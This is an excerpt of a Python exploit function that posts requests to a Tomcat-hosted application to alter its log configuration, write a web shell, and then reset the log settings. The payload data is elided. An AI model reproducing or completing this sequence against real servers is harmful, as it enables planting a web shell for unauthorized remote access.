...
def run_exploit(url, directory, filename):
    ...
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False, stream=True)
    print("[*] Response code: %d" % ret.status_code)

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False, stream=True)
    print("[*] Response code: %d" % ret.status_code)
    ...
    print("[*] Send the packet that writes the web shell")
    ret = requests.get(url, headers=get_headers, verify=False,stream=True)
    print("[*] Response code: %d" % ret.status_code)
    ...
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False, stream=True)
    print("[*] Response code: %d" % ret.status_code)
